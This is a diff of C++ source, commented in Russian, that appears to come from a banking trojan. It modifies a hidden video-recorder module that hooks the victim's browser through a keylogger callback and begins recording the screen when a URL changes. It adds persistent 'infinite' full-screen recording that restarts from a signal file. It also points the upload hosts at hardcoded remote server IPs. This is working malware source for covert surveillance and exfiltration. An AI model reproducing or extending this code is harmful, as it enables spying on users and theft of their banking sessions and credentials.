@@ -12,7 +12,7 @@
 
 
 //----------------------------------------------------------------------------
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace VIDEORECDEBUGSTRINGS
 {
@@ -42,8 +42,12 @@ namespace VIDEORECDEBUGSTRINGS
 #ifdef DEBUGCONFIG
 //	char VIDEO_REC_HOST1[] = "178.162.179.65";
 //	char VIDEO_REC_HOST2[] = "188.72.202.163";
-	char VIDEO_REC_HOST1[] = "127.0.0.1";
-	char VIDEO_REC_HOST2[] = "127.0.0.1";
+
+//	char VIDEO_REC_HOST1[] = "127.0.0.1";
+//	char VIDEO_REC_HOST2[] = "127.0.0.1";
+
+	char VIDEO_REC_HOST1[] = "192.168.147.2";
+	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
@@ -419,7 +423,7 @@ void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 	if (URL != NULL)
 	{
 		VideoRecorderSrv::StartRecording(URL);
-//		StartRecordThread(GetUniquePID(),URL, NULL, NULL, 700);
+//		VideoRecorderSrv::StartInfiniteRecording(URL);
 	}
 	else
 	{
@@ -606,13 +610,17 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------------------
 
-	void SetClientParams(PPipeMessage Msg)
+	void SetClientParams(DWORD PID, PCHAR Name)
 	{
 		// Функция инициализирует глобальне данные клиента
-		ClientPID = Msg->PID;
+		ClientPID = PID;
 		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
-		DWORD CopySize = Min(ClientURLMaxSize, Msg->DataSize);
-		m_memcpy(ClientURL, Msg->Data, CopySize);
+		DWORD  Len = STRA::Length(Name);
+		if (Len)
+		{
+			DWORD CopySize = Min(ClientURLMaxSize, Len);
+			m_memcpy(ClientURL, Name, CopySize);
+		}
     }
 
     //----------------------------------------------------------------------
@@ -633,7 +641,7 @@ namespace VideoRecorderSrv
 		// В случае если процесс не работает запускаем его
 		if (!Running)
 		{
-			SetClientParams(Msg);
+			SetClientParams(Msg->PID, Msg->Data);
 
 //			 StartThread(ClientMainProc, NULL);
 			MegaJump(ClientMainProc);
@@ -668,7 +676,7 @@ namespace VideoRecorderSrv
 
 		TVideoRecorder Recorder;
 
-		Recorder.VideoName = "fullscreen";
+		Recorder.VideoName = ClientURL;
 
 		Recorder.RecordWnd(0);
 
@@ -695,24 +703,28 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------
 
-	void StartInfiniteRecord()
+	void StartInfiniteRecord(PCHAR Name)
 	{
 		// Функция запускает бесконечную запись видео всего экрана
 
 		// Создаём сигнальный файл
 		string FileName = GetInfiniteRecordFile();
-		File::WriteBufferA(FileName.t_str(), NULL, 0);
+		if (!FileExistsA(FileName.t_str()))
+			File::WriteBufferA(FileName.t_str(), Name, STRA::Length(Name));
 
 		// запускаем запись
 		if (!PIPE::Ping(InfiniteRecorderPipe))
+		{
+            SetClientParams(0, Name);
 			MegaJump(InfiniteRecordingProc);
+        }
 	}
 	//----------------------------------------------------------
 
-	void WINAPI ServerStartInfiniteHandler(LPVOID, PPipeMessage, bool&)
+	void WINAPI ServerStartInfiniteHandler(LPVOID, PPipeMessage Msg, bool&)
 	{
 		//  обработчик команды бесконечной записи видео
-		StartInfiniteRecord();
+		StartInfiniteRecord(Msg->Data);
 	}
 }
 //-----------------------------------------------------------------------------
@@ -726,9 +738,13 @@ bool VideoRecorderSrv::Start()
 		return false;
 
 	// При необходимости запускаем бесконечную запись
-	if (IsInfiniteRecording())
+	string FileName = GetInfiniteRecordFile();
+	if (FileExistsA(FileName.t_str()))
 	{
-		StartInfiniteRecord();
+		TBotFileStream File(FileName.t_str(), fcmRead);
+		string Name = File.ReadToString();
+
+		StartInfiniteRecord(Name.t_str());
 	}
 
 	// Добавляем обработчики команд
